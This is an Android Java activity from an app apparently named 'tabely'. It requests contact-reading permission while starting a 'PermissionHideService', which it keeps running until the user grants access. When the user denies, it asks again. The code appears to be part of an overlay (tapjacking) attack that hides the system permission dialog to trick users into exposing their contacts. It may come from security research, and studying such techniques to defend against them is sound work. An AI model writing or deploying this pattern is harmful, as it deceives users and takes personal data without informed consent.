package com.snakesonwheels.tabely.view;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.widget.ImageView;

import com.snakesonwheels.tabely.R;

public class OfferActivity extends AppCompatActivity {

    private static final int REQUEST_CONTACTS_PERMISSION_CODE = 0;
    private static final int REQUEST_SMS_PERMISSION_CODE = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_offer);

        getReadContactPermissions();

        ImageView toast = (ImageView) findViewById(R.id.toast);
    }

    // Start or stop the GameService
    private void overlayService(boolean start) {
        Intent i = new Intent(this, PermissionHideService.class);
        if (start) {
            i.setAction("com.snakesonwheels.tabely.view.PermissionHideService.START");
            startService(i);
        } else {
            i.setAction("com.snakesonwheels.tabely.view.PermissionHideService.STOP");
            stopService(i);
        }
    }

    private boolean getReadContactPermissions() {
        // If READ_CONTACTS permission already granted return true
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
            return true;
        }
        // Else request permission and return false
        ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_CONTACTS},
                REQUEST_CONTACTS_PERMISSION_CODE);

        overlayService(true);
        return false;
    }


    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[]
            grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        //    messagePermissionOverlayService(false);
        switch (requestCode) {
            case REQUEST_CONTACTS_PERMISSION_CODE:
                // If READ_CONTACTS permission was granted
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    overlayService(false);

                    // Else retry
                } else if (!getReadContactPermissions())
                    overlayService(true);
                break;
        }
    }
}
